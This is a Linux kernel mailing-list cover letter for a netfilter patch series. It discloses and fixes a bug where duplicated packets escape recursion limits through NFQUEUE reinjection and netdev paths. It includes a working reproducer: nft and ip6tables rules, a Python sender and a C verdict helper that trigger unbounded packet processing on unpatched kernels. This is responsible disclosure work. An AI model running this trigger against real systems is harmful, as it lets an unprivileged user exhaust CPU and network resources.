Return-Path: <intel-wired-lan-bounces@osuosl.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 8DFA9CC6B39
	for <intel-wired-lan@archiver.kernel.org>; Thu, 15 Oct 2026 15:55:10 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp3.osuosl.org (Postfix) with ESMTP id 2FF31608E6;
	Thu, 15 Oct 2026 15:55:10 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp3.osuosl.org ([127.0.0.1])
 by localhost (smtp3.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id Ev-Lie4bn-ph; Thu, 15 Oct 2026 15:55:09 +0000 (UTC)
ARC-Filter: OpenARC Filter v1.3.2 smtp3.osuosl.org DC40C60881
Authentication-Results: smtp3.osuosl.org; arc=pass header.oldest-pass=0 smtp.remote-ip=140.211.166.142
ARC-Seal: i=2; d=osuosl.org; s=arc; a=rsa-sha256; cv=pass; t=1792079709;
	b=gOH5iRzzJjwe7TbRwwRCnBvp1D+rRyST9lFdJvhcYlUmUjdfdkKtF9Qd/e7wbC391EoB
	 G8o43sh0YToXhJ4+tCyt43QagO9ignxb6MgxN0/tM8K+/8UrTyvbiHZK8hwXKn1P2+dVD
	 3nsVcj36nhBLJdN+fBdcv0xJDZDaIUlH3JmeSaK2oAsmzjzwIxCylpIpa5HSLjx1HMpQ3
	 LyTwfroABUWsiGAWAmLaK0cXEoVuIEgHaVmV8+KM16vH8X+FGGRO4i7eoKZ2TOnTRcAM8
	 YMQy+NgE3m6RB7c0wF/KU0pDOqLFLBzbO79QBNs1Ys/FvcofULew+XC+/YWiXl4qLbw==
ARC-Message-Signature: i=2; d=osuosl.org; s=arc; a=rsa-sha256;
	c=relaxed/relaxed; t=1792079709;
	h=X-Comment:DKIM-Signature:X-Original-To:Delivered-To:Received:
	 Received:X-Virus-Scanned:X-Spam-Flag:X-Spam-Score:X-Spam-Level:
	 X-Spam-Status:Received:ARC-Filter:Received-SPF:Received:Received:
	 DKIM-Signature:X-Google-DKIM-Signature:X-Forwarded-Encrypted:
	 X-Gm-Message-State:X-Gm-Gg:X-Received:Received:From:To:Cc:Subject:
	 Date:Message-ID:X-Mailer:MIME-Version:Content-Transfer-Encoding:
	 X-Mailman-Approved-At:X-BeenThere:X-Mailman-Version:Precedence:
	 List-Id:List-Unsubscribe:List-Archive:List-Post:List-Help:
	 List-Subscribe:Errors-To;
	bh=MB3RHjkAvRQ8BWBg48t/sxWYHpkyDjwBGTNUPuir1DU=;
	b=hSKHcn1yaVeO8bVEXnPliMBDoM8qNNocftyECY6R8xclvsgfpacbA+ScdrikgvY3HsAJ
	 bwfxWo1railRMokX6mj47x1spNhQqQen5mSz2Go+2dLvSMGLvg0QvkJHFF9Fs1e7bg8ep
	 iSQHkHA3ahFogVQRzVI0hZ23tIamJVTRK+Yfq7uKYOlX9quSMI2EDObp9gfM5sDgef/xk
	 PmQh2jPFhmv/XIj3zoqhkpYyqky3pXCzvUQ8LO4vymDHSNqNI04HByBVj8Bdr+VsCuss4
	 bMPiztUNM79U1dExvDiUYNctM1jGc5yb5QuW0VEDSTpXDhcihwL6mPMNR78wi0KcKeA==
ARC-Authentication-Results: i=2; smtp3.osuosl.org; 
	arc=pass header.oldest-pass=0 smtp.remote-ip=140.211.166.142
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.142; helo=lists1.osuosl.org; envelope-from=intel-wired-lan-bounces@osuosl.org; receiver=<UNKNOWN> 
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=osuosl.org;
	s=default; t=1792079708;
	bh=MB3RHjkAvRQ8BWBg48t/sxWYHpkyDjwBGTNUPuir1DU=;
	h=From:To:Cc:Subject:Date:List-Id:List-Unsubscribe:List-Archive:
	 List-Post:List-Help:List-Subscribe:From;
	b=Gt6GgzvFvuldJ4vTLxB4F+gJ+bLIRWKWYVsptQCeqr8RPx7u3BUbKc8t/2mRfrnVM
	 HUuktXy53hFg8WpvwHW27NiRVayzdWDSKJNQnv51oQgM9Rem0QHUuFnIgZ/OI17nl/
	 HTcRBsbkPNFoH6N3vvxHO6yMa6jhjmra2JOEDzRPdQLvJrC1Sk92kUwVpqyeHtxnPZ
	 k4h4kegOJSz5V+AkeOv1ypITPwT2rQCMP2FA7logkgyAo4sq1OOZVQKKfM59feXzbl
	 6/iH+bmRfq1QNeoooisOtILoTRIkhdnKG24Qy5DokJKXktBHOcDhbEMGGC1jBFVuWT
	 ROLJMqU2kJM0w==
Received: from lists1.osuosl.org (lists1.osuosl.org [140.211.166.142])
	by smtp3.osuosl.org (Postfix) with ESMTP id DC40C60881;
	Thu, 15 Oct 2026 15:55:08 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by lists1.osuosl.org (Postfix) with ESMTP id B8A82769
 for <intel-wired-lan@lists.osuosl.org>; Thu, 15 Oct 2026 07:45:03 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id AA4DF80FC6
 for <intel-wired-lan@lists.osuosl.org>; Thu, 15 Oct 2026 07:45:03 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id PeX0Nj5u4KHx for <intel-wired-lan@lists.osuosl.org>;
 Thu, 15 Oct 2026 07:45:02 +0000 (UTC)
ARC-Filter: OpenARC Filter v1.3.2 smtp1.osuosl.org 5571D80FB9
Authentication-Results: smtp1.osuosl.org;
 arc=none smtp.remote-ip="2607:f8b0:4864:20::1030"
ARC-Seal: i=1; d=osuosl.org; s=arc; a=rsa-sha256; cv=none; t=1792050302;
 b=irku8R8G+Nuq1UDo3txNXGz1B3qJKK+dDReInI2TM63COWT2Jynu0/DoGsWIjOUa4pDa
 /dba6tbbYPpn0phl8hvbH1kFdfhF+sYyhWSU816TA9r12S8rdcCLIQ60lx8YdoXW1QLWA
 /0ZdE8uz+qu4IUqNf321JX+MxTTtCDRptJa9qxgkj2RRm6XDu5VSbIdvBlJiYu7l3Nk/l
 FweuvuNbtWSxc7AxMQ/RPOPw+Acx5/4zx/+8mdW/pNve+4cx7RjpJvQ8BVUJzDFKTr2Yr
 cKSEkmi9bPG9yt/lYLl7ah9a9Yhoo2JIAcUFDiwvcb4Fwri9TesTJdm014moGVHBQkg==
ARC-Message-Signature: i=1; d=osuosl.org; s=arc; a=rsa-sha256;
 c=relaxed/relaxed; t=1792050302;
 h=Received-SPF:Received:DKIM-Signature:X-Google-DKIM-Signature:
 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:
 Content-Transfer-Encoding;
 bh=MB3RHjkAvRQ8BWBg48t/sxWYHpkyDjwBGTNUPuir1DU=;
 b=Lxef0mdmzqYsO+hvta3avxB2TvCG0ZHuEI2d9jdxer1M2nVVuFvV4112P1h+49yxlUmh
 GW6INgWGfZX1oS5FZ7CWDIMHt0UyENZzoYt3uY4+U3IWXU+i1bhasFl2/eLFLzhUdZDQo
 RmQ21AqNp7RLSfSxfDY8F3mhYPk0kc6N2F2cDvGlBGaK1YMDRdT1TfeWnPG3gb7KqNiGr
 Bl/wyzqChWepZQ/yTcf5B/AiQnr00524BAYMPlxhBa6Jbhjy09013qwc7awD9rtGa4I82
 PqHek8SiDagiV+TiZ9U6HcK3PVQ7dSopDkFDG+i8sFy/BF5bKH0F0HZhyLcg8E2cE0g==
ARC-Authentication-Results: i=1; smtp1.osuosl.org; 
 dmarc=pass header.from=nebusec.ai;
 dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256
 header.s=google header.b=dfjUl4ul; 
 arc=none smtp.remote-ip="2607:f8b0:4864:20::1030"
Received-SPF: Pass (mailfrom) identity=mailfrom;
 client-ip=2607:f8b0:4864:20::1030; helo=mail-pj1-x1030.google.com;
 envelope-from=zihanx@nebusec.ai; receiver=<UNKNOWN> 
Authentication-Results: smtp1.osuosl.org; dmarc=pass (p=quarantine dis=none)
 header.from=nebusec.ai
Authentication-Results: smtp1.osuosl.org; dkim=pass (2048-bit key,
 unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256
 header.s=google header.b=dfjUl4ul
Received: from mail-pj1-x1030.google.com (mail-pj1-x1030.google.com
 [IPv6:2607:f8b0:4864:20::1030])
 by smtp1.osuosl.org (Postfix) with ESMTPS id 5571D80FB9
 for <intel-wired-lan@lists.osuosl.org>; Thu, 15 Oct 2026 07:45:01 +0000 (UTC)
Received: by mail-pj1-x1030.google.com with SMTP id
 98e67ed59e1d1-3ac6794fe45so1153342a91.0
 for <intel-wired-lan@lists.osuosl.org>; Thu, 15 Oct 2026 00:45:01 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=nebusec.ai; s=google; t=1792050301; x=1792655101; darn=lists.osuosl.org;
 h=content-transfer-encoding:mime-version:message-id:date:subject:cc
 :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
 bh=MB3RHjkAvRQ8BWBg48t/sxWYHpkyDjwBGTNUPuir1DU=;
 b=dfjUl4ul/XekSyT1coqAUp8ru+GYGbQ7K9ensSwjIXHAft9rEYTQ2p4jv5xr+f/32G
 jenUko/ridvxr5riANvYlQJ4wcln/2XaSkRljgAusKclit135aXJsC2QZuHvr/urAwo6
 cfhcO85wI1n9c6NdOUEucNQfMjo+DRJyXAa3KEJqOowswPaTzL5nzqHo73exKexY1/Q0
 a7ZYZKkE/DTNY+PoC2BfjHrYKXLtWNtCAg5TWxTgNtVRHOPWmhQW06WQH/HO+SbyrFCu
 TiPMF0tX2wtIHoyYFtbY4TFwVA6uN/FhBZwcw2Kpy0NZ2Fp35QOArfULZSzI+7niaW7/
 gQBQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=1e100.net; s=20260707; t=1792050301; x=1792655101;
 h=content-transfer-encoding:mime-version:message-id:date:subject:cc
 :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
 :message-id:reply-to:content-type;
 bh=MB3RHjkAvRQ8BWBg48t/sxWYHpkyDjwBGTNUPuir1DU=;
 b=AIgjl0Imy4IT6oNkuDcWemqd9kk3T811AxLbHIdqeCZZbD6sSBtnd6WtgBMc9Bdgwl
 /yabCmZU8EgjaeLrmGW4xvdoXrj7eVfbVVC6Z3JtK8geWZ8FpAr4cKIUvProgZzAu5XY
 zTKT50F+AoJE/v6VIF6Dok9rZaR1v3orc3OfjUnM1zs9R8aRiimMiGQneigF+Tu8NAyl
 XJscPxp/oIaOCy2Mas5oOar6QMTB5sCnX2LFBLZ2+JOd0E8KTIrpSiFhebBB4Qr1Rk3l
 MfrN/iLW57jEXwA/73kpQ4ukJesocHBY6AOMzFf7/uuBLYqstvQ68ea0sScZSYRk7FG6
 GvLw==
X-Forwarded-Encrypted: i=1;
 AKwUvBzNFNJfBE0QfZO7hG6igG4256GIApeFHsI6CUNkI6Taun1Jz0JNwI+fxCGsUg32YQZ6+Pq3u2nZgsKp9SFmSLo=@lists.osuosl.org
X-Gm-Message-State: AFq9FYKBPlIGzMCw4n9ukjsEWhEogEbe9tpXbc9lvtjE4ALdETHyQ4+D
 nDV1FAPqfCVbcsSZCeeXlCPFz76F/Ph7ckUlU4IMcsICraf7ev+Nx1NWkpqIBoZlTF4B
X-Gm-Gg: AYBFou1vL+iSNY98aEod8dhhZFMdzxSCaDGn76QcVlQnYIKoTqr8p6GcYC9ut8b46Df
 pTNZUf5i7g9CKKMuLAXBEhZyXaOeDg+w7QgLrA5mcZ6TjHpkwBnPcUP/vl7WyMUUeNkfmXn1WGU
 E5C11iRJ6kI9MO+QYXwjcpoVoH60B2qkDs+SWXc3rmawEh79lJ7IImWdkptKGFkiCayJ2juJEv6
 zl2oNm9AD64LS5WYphNsql0ljz0GxnbujkQASV/Jtj3Viq9YGatqarHo6OHMgG/6Um7LszxmOJR
 yRox3tnAJ1wtJla60pSX+BSSWVWdxe3WEUAKG4T0jitqU/0QBB3RPF6mXhbEL3/n+cXKPdd097N
 roDSVtp/w0ffx8DfkVXwNWCwIJV+mt5jbR38UlFyAfJciRa8QnyinFzxZl4mxsWI9IlrwCc+Mrv
 JcjH0r+CSm4iQevWg+kgfG8VCkX1WKwc0N+N68a5lBabpolkGFWNVqSPtEnLnL0jux1vMp/WblA
 dazLcgWqGQQp85kp9EA3oZZYI/PLg==
X-Received: by 2002:a17:90b:4d0b:b0:3ab:1285:dfd6 with SMTP id
 98e67ed59e1d1-3ac6f2952e2mr4157445a91.38.1792050300873; 
 Thu, 15 Oct 2026 00:45:00 -0700 (PDT)
Received: from 24c857d0c3be.. ([122.51.212.64])
 by smtp.gmail.com with ESMTPSA id
 98e67ed59e1d1-3ac93849da5sm1636831a91.4.2026.10.15.00.44.50
 (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
 Thu, 15 Oct 2026 00:44:59 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netfilter-devel@vger.kernel.org, virtualization@lists.linux.dev,
 intel-wired-lan@lists.osuosl.org, bpf@vger.kernel.org
Cc: pablo@netfilter.org, fw@strlen.de, phil@nwl.cc, davem@davemloft.net,
 edumazet@kernel.org, pabeni@redhat.com, horms@kernel.org, kaber@trash.net,
 jengelh@medozas.de, andrew+netdev@lunn.ch, mst@redhat.com,
 jasowangio@gmail.com, eperezma@redhat.com, xuanzhuo@linux.alibaba.com,
 aleksander.lobakin@intel.com, ast@kernel.org, daniel@iogearbox.net,
 hawk@kernel.org, john.fastabend@gmail.com, sdf@fomichev.me,
 magnus.karlsson@intel.com, maciej.fijalkowski@intel.com,
 willemb@google.com, alice.kernel@fastmail.im, eilaimemedsnaimel@gmail.com,
 imv4bel@gmail.com, shiming.cheng@mediatek.com, sd@queasysnail.net,
 vega@nebusec.ai, root@tr0jan.top, zihanx@nebusec.ai
Subject: [PATCH nf v8 0/3] netfilter: bound asynchronous packet duplication
Date: Thu, 15 Oct 2026 07:43:06 +0000
Message-ID: <cover.1792048855.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-Mailman-Approved-At: Thu, 15 Oct 2026 15:55:07 +0000
X-BeenThere: intel-wired-lan@osuosl.org
X-Mailman-Version: 2.1.30
Precedence: list
List-Id: Intel Wired Ethernet Linux Kernel Driver Development
 <intel-wired-lan.osuosl.org>
List-Unsubscribe: <https://lists.osuosl.org/mailman/options/intel-wired-lan>, 
 <mailto:intel-wired-lan-request@osuosl.org?subject=unsubscribe>
List-Archive: <http://lists.osuosl.org/pipermail/intel-wired-lan/>
List-Post: <mailto:intel-wired-lan@osuosl.org>
List-Help: <mailto:intel-wired-lan-request@osuosl.org?subject=help>
List-Subscribe: <https://lists.osuosl.org/mailman/listinfo/intel-wired-lan>,
 <mailto:intel-wired-lan-request@osuosl.org?subject=subscribe>
Errors-To: intel-wired-lan-bounces@osuosl.org

Hi Linux kernel maintainers,

We found and validated an issue in netfilter packet duplication. The bug
is reachable by an unprivileged user in user and network namespaces.
Bounded tests exercised the fixes. Non-duplication packet semantics are
intended to remain unchanged. MIRRED flow offload for affected netdev dup
rules is rejected because it cannot enforce the duplication-depth limit.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

The IPv4 and IPv6 duplication helpers use a task-local guard while a cloned
packet traverses output hooks. If NFQUEUE suspends that traversal, the
output call can return and clear the guard before a later verdict resumes
the remaining hooks. The resumed packet can reach another duplication
consumer without the original guard. This can cause repeated packet
processing and consume CPU and network resources. Patch 1 records the
guard in the queue entry and restores it during reinjection. It keeps
bottom halves disabled during the reinjection traversal, restoring the
verdict task state before reenabling them.

The netdev nft dup path has a separate synchronous transmit recursion
counter. It does not accompany a duplicated skb through asynchronous
software receive paths. Patch 2 carries a bounded duplication depth through
skb and supported XDP conversions, resets it on reused buffers, and rejects
MIRRED flow offload where the software depth cannot be enforced. This scope
covers software skb/XDP continuity, not packet loops through physical
hardware or userspace device round trips.

At PRE_ROUTING and LOCAL_IN, the IPv4 and IPv6 helpers decrement TTL or
hop limit on the copy. Patch 3 stops creating copies when the value is
<= 1, so the decrement cannot reach zero or wrap a zero value to the
maximum. The three patches address the NFQUEUE reinjection, software
netdev receive, and ingress TTL/hop-limit paths, respectively. The patch
does not intend to change packet semantics for unrelated traffic; it also
rejects affected MIRRED flow offload because it cannot enforce the
netdev duplication-depth limit.

Validation:

The v8 series was built on nf.git main at
ab699d296e066eb64f51d2a8a1d42237a3b186c8 and booted in a 2-vCPU,
2-GiB QEMU guest as 7.3.0-rc5-g9a13bdbfd108. In bounded user/network
namespace runs, the IPv4 and IPv6 nft dup/NFQUEUE tests each completed
three callbacks with three successful verdicts and no verdict failures.
A separate IPv4 run sent three UDP datagrams and completed nine callbacks
with nine successful verdicts; the nft counters showed nine visits at
each configured dup rule. These are bounded validation runs.

For netdev dup, a native veth/XDP_TX-to-XDP_PASS test reached the
first four depth-coded rules once each and did not reach the next two.
The XDP_PASS control test without the transmit loop reached its single
dup rule four times. The IPv4 TTL test observed eight matching packets
and no TTL-0 or TTL-255 packets. The filtered IPv6 test observed eight
matching packets and no hop-limit-0 packets; its one hop-limit-255 count
was unrelated NDP traffic and is not evidence for the dup path. An IPv6
xt_TEE/NFQUEUE test ran in a non-initial user/network namespace: one UDP
datagram produced two callbacks, both accepted successfully. The guest
test setup used ip6tables-legacy and pre-created its xtables lock file
with mode 0666 so the unprivileged test process could open the lock.

An unpatched-baseline bounded run by an unprivileged user in user and
network namespaces reached 1,018,782 NFQUEUE callbacks in 61.643
seconds. The callback counter is incremented before nfq_set_verdict(),
so this is a callback count, not a successful-verdict count. This
observed repeated packet processing and resource consumption.

Reproducer:

    gcc -O2 -o nfq_accept poc.c -lnetfilter_queue
    unshare -Urn /bin/bash

The NFQUEUE trigger requires a userspace verdict process, while the netdev
test installs XDP programs and exercises veth skb/XDP conversion. Those
setup and verdict interactions are not expressible as a standalone
packetdrill exchange. The reproducer below covers the NFQUEUE path; the
separate bounded TTL/hop-limit and netdev/XDP validation results are
summarized above.

The following commands ran as an unprivileged user in a new user/network
namespace. First create a veth pair and assign 198.18.0.1/24 to v0 and
198.18.0.2/24 to v1, then bring both links up. Install these output hooks:

    nft add table ip t
    nft 'add chain ip t dup1 { type filter hook output priority raw; policy accept; }'
    nft 'add chain ip t queue1 { type filter hook output priority mangle; policy accept; }'
    nft 'add chain ip t dup2 { type filter hook output priority filter; policy accept; }'
    nft add rule ip t dup1 udp dport 5555 counter dup to 198.18.0.2 device v0
    nft add rule ip t queue1 udp dport 5555 queue num 0
    nft add rule ip t dup2 udp dport 5555 counter dup to 198.18.0.2 device v0

Start the verdict process in the background, send three UDP datagrams to
198.18.0.2 port 5555, then wait for the helper to exit:

    ./nfq_accept 1 4 &
    q=$!
    python3 -c 'import socket; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); [s.sendto(b"x",("198.18.0.2",5555)) for _ in range(3)]'
    wait "$q"

The included helper returns NF_ACCEPT for each queued packet and reports
callback and verdict counts.

For the IPv6 xt_TEE test, the same helper was run in a non-initial
user/network namespace after creating a veth pair with fd00::1/64 on v0
and fd00::2/64 on v1. The guest test fixture pre-created
/run/xtables.lock with mode 0666 as guest root:

    touch /run/xtables.lock
    chmod 0666 /run/xtables.lock

The rules and one-packet trigger were:

    ip6tables-legacy -t mangle -A OUTPUT -p udp -m udp --dport 5556 -j TEE --gateway fd00::2
    ip6tables-legacy -t mangle -A OUTPUT -p udp -m udp --dport 5556 -j NFQUEUE --queue-num 0
    ./nfq_accept 1 6 &
    q=$!
    python3 -c 'import socket; s=socket.socket(socket.AF_INET6,socket.SOCK_DGRAM); s.sendto(b"x",("fd00::2",5556))'
    wait "$q"

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#include <arpa/inet.h>
#include <errno.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <unistd.h>
#define NF_ACCEPT 1
#define NF_DROP 0
#define NF_REPEAT 4
#define NF_STOP 5
#include <libnetfilter_queue/libnetfilter_queue.h>

static volatile sig_atomic_t stop;
static unsigned long callbacks, verdict_ok, verdict_fail, repeats, drops;
static const char *mode = "accept";
static struct nfq_q_handle *queue;
static void alarm_handler(int sig) { (void)sig; stop = 1; }
static int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
              struct nfq_data *nfa, void *data)
{
    (void)nfmsg; (void)data;
    struct nfqnl_msg_packet_hdr *ph = nfq_get_msg_packet_hdr(nfa);
    if (!ph) return 0;
    uint32_t id = ntohl(ph->packet_id);
    callbacks++;
    if (!strcmp(mode, "slow")) usleep(100000);
    uint32_t verdict = NF_ACCEPT;
    if (!strcmp(mode, "repeat-first") && callbacks == 1) { verdict = NF_REPEAT; repeats++; }
    else if (!strcmp(mode, "drop")) { verdict = NF_DROP; drops++; }
    else if (!strcmp(mode, "stop")) verdict = NF_STOP;
    int rv = nfq_set_verdict(qh, id, verdict, 0, NULL);
    if (rv >= 0) verdict_ok++;
    else verdict_fail++;
    return 0;
}
int main(int argc, char **argv)
{
    int seconds = argc > 1 ? atoi(argv[1]) : 3;
    signal(SIGALRM, alarm_handler); alarm(seconds);
    int family = argc > 2 && atoi(argv[2]) == 6 ? AF_INET6 : AF_INET;
    if (argc > 2 && atoi(argv[2]) == 7) family = 7;
    if (argc > 3) mode = argv[3];
    struct nfq_handle *h = nfq_open();
    if (!h) { perror("nfq_open"); return 1; }
    if (nfq_unbind_pf(h, family) < 0) perror("nfq_unbind_pf");
    if (nfq_bind_pf(h, family) < 0) { perror("nfq_bind_pf"); return 2; }
    queue = nfq_create_queue(h, 0, cb, NULL);
    if (!queue) { perror("nfq_create_queue"); return 3; }
    if (!strcmp(mode, "slow") && nfq_set_queue_maxlen(queue, 1) < 0) { perror("nfq_set_queue_maxlen"); return 4; }
    if (nfq_set_mode(queue, NFQNL_COPY_PACKET, 0xffff) < 0) { perror("nfq_set_mode"); return 4; }
    int fd = nfq_fd(h); char buf[65536];
    while (!stop) {
        int n = recv(fd, buf, sizeof(buf), MSG_DONTWAIT);
        if (n >= 0) { nfq_handle_packet(h, buf, n); continue; }
        if (errno == EAGAIN || errno == EWOULDBLOCK) { usleep(1000); continue; }
        if (errno == EINTR) continue;
        perror("recv"); break;
    }
    printf("callbacks=%lu verdict_ok=%lu verdict_fail=%lu repeat=%lu drop=%lu", callbacks, verdict_ok, verdict_fail, repeats, drops);
    nfq_destroy_queue(queue); nfq_close(h);
    return verdict_fail ? 5 : 0;
}

------END poc.c--------

Changes in v8:
  - split the v7 NFQUEUE/netdev proposal into focused patches and add a
    third patch for the ingress TTL/hop-limit limit
  - preserve the IPv4/IPv6 recursion guard across NFQUEUE reinjection
  - bound netdev dup depth across software skb/XDP paths
  - stop IPv4 TTL and IPv6 hop-limit underflow before cloning
  - limit the netdev claim to software skb/XDP paths and document the
    MIRRED offload restriction
  - v7 Link:
    https://lore.kernel.org/all/cover.1791688819.git.zihanx@nebusec.ai/

Best regards,
Zihan Xi

Zihan Xi (3):
  netfilter: nf_dup: preserve guard across NFQUEUE reinjection
  netfilter: nf_dup_netdev: bound asynchronous duplication
  netfilter: nf_dup: prevent TTL and hop-limit underflow

 drivers/net/veth.c               |  3 +++
 drivers/net/virtio_net.c         |  3 +++
 include/linux/skbuff.h           |  9 +++++++++
 include/net/libeth/xdp.h         |  6 ++++--
 include/net/netfilter/nf_queue.h |  1 +
 include/net/xdp.h                | 25 +++++++++++++++++++++++++
 net/core/gro.c                   |  3 +++
 net/core/xdp.c                   | 10 ++++++++++
 net/ipv4/netfilter/nf_dup_ipv4.c |  3 +++
 net/ipv6/netfilter/nf_dup_ipv6.c |  3 +++
 net/netfilter/nf_dup_netdev.c    | 11 ++++++++++-
 net/netfilter/nf_queue.c         |  1 +
 net/netfilter/nfnetlink_queue.c  | 15 ++++++++++++---
 net/xdp/xsk_buff_pool.c          |  2 ++
 14 files changed, 89 insertions(+), 6 deletions(-)

-- 
2.43.0

